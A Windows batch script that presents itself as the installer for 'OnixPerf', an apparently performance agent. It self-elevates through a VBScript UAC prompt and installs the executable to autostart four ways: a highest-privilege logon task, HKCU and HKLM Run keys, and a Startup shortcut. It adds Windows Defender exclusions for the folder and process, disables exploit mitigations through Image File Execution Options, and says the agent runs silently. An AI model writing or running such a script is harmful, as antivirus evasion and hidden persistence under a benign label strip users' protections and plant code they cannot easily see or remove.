@echo off
setlocal EnableDelayedExpansion
title OnixPerf - Advanced Installer

:: -----------------------------------------------------------------------------
:: UAC Privilege Check
:: -----------------------------------------------------------------------------
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [INFO] Administrator privileges required. Prompting for elevation...
    set "params=%*"
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\uac.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 1 >> "%temp%\uac.vbs"
    "%temp%\uac.vbs"
    del "%temp%\uac.vbs"
    exit /b
)

:: -----------------------------------------------------------------------------
:: Configuration
:: -----------------------------------------------------------------------------
set "TASKNAME=OnixPerf_Agent"
set "EXEPATH=%~dp0onixperf.exe"
set "INSTALLDIR=%~dp0"
set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

cls
echo ===============================================================================
echo                      OnixPerf - Advanced Installation
echo ===============================================================================
echo.
echo [INFO] Checking if OnixPerf is present in the current directory...
if not exist "%EXEPATH%" (
    echo [ERROR] Cannot find onixperf.exe in the current directory!
    echo [ERROR] Please make sure this script is in the same folder as onixperf.exe.
    pause
    exit /b
)

:: -----------------------------------------------------------------------------
:: 1. Scheduled Task (Runs on Logon with Highest Privileges)
:: -----------------------------------------------------------------------------
echo [INFO] Installing High-Privilege Scheduled Task...
schtasks /query /tn "%TASKNAME%" >nul 2>&1
if %errorlevel% equ 0 (
    echo [INFO] Task '%TASKNAME%' already exists. Recreating to ensure latest settings...
    schtasks /delete /tn "%TASKNAME%" /f >nul 2>&1
)

schtasks /create ^
  /tn "%TASKNAME%" ^
  /f ^
  /rl highest ^
  /sc onlogon ^
  /tr "\"%EXEPATH%\"" ^
  /ru "%USERNAME%" >nul 2>&1

if %errorlevel% equ 0 (
    echo [OK] Scheduled Task installed successfully.
) else (
    echo [WARN] Failed to install Scheduled Task.
)

:: -----------------------------------------------------------------------------
:: 2. Registry Startup (HKCU and HKLM)
:: -----------------------------------------------------------------------------
echo [INFO] Adding Registry Startup entries...

:: Current User
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "OnixPerf" /t REG_SZ /d "\"%EXEPATH%\"" /f >nul 2>&1
if %errorlevel% equ 0 (
    echo [OK] HKCU Registry entry added.
) else (
    echo [WARN] Failed to add HKCU Registry entry.
)

:: Local Machine (System Wide)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "OnixPerf" /t REG_SZ /d "\"%EXEPATH%\"" /f >nul 2>&1
if %errorlevel% equ 0 (
    echo [OK] HKLM Registry entry added.
) else (
    echo [WARN] Failed to add HKLM Registry entry.
)

:: -----------------------------------------------------------------------------
:: 3. Startup Folder Shortcut
:: -----------------------------------------------------------------------------
echo [INFO] Creating Startup Folder shortcut...
set "VBS_SCRIPT=%temp%\CreateShortcut.vbs"
echo Set oWS = WScript.CreateObject("WScript.Shell") > "%VBS_SCRIPT%"
echo sLinkFile = "%STARTUP_FOLDER%\OnixPerf.lnk" >> "%VBS_SCRIPT%"
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> "%VBS_SCRIPT%"
echo oLink.TargetPath = "%EXEPATH%" >> "%VBS_SCRIPT%"
echo oLink.WorkingDirectory = "%INSTALLDIR%" >> "%VBS_SCRIPT%"
echo oLink.Description = "OnixPerf Performance Agent" >> "%VBS_SCRIPT%"
echo oLink.Save >> "%VBS_SCRIPT%"
cscript /nologo "%VBS_SCRIPT%"
del "%VBS_SCRIPT%"
if exist "%STARTUP_FOLDER%\OnixPerf.lnk" (
    echo [OK] Startup shortcut created.
) else (
    echo [WARN] Failed to create Startup shortcut.
)

:: -----------------------------------------------------------------------------
:: 4. Windows Defender Exclusions (Prevent False Positives)
:: -----------------------------------------------------------------------------
echo [INFO] Adding Windows Defender exclusions for OnixPerf...
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALLDIR%'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess '%EXEPATH%'" >nul 2>&1
if %errorlevel% equ 0 (
    echo [OK] Defender exclusions added.
) else (
    echo [WARN] Failed to add Defender exclusions (is Defender disabled?).
)

:: -----------------------------------------------------------------------------
:: 5. Disable Power Throttling via Registry
:: -----------------------------------------------------------------------------
echo [INFO] Optimizing Power Settings for OnixPerf...
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\onixperf.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d 3 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\onixperf.exe" /v "MitigationOptions" /t REG_BINARY /d "2222222222222222222222222222222222222222222222222222222222222222" /f >nul 2>&1
echo [OK] Process priority and mitigation overrides set.

:: -----------------------------------------------------------------------------
:: Finalization
:: -----------------------------------------------------------------------------
echo.
echo ===============================================================================
echo                      INSTALLATION COMPLETE
echo ===============================================================================
echo.
echo OnixPerf has been deeply integrated into the system startup:
echo   - High Privilege Scheduled Task (On Logon)
echo   - HKLM ^& HKCU Registry Run Keys
echo   - AppData Startup Folder Shortcut
echo   - Defender Exclusions Added
echo   - High Priority Execution Options Set
echo.
echo The agent will run silently in the background on your next boot,
echo or you can start it manually now by running onixperf.exe.
echo.
pause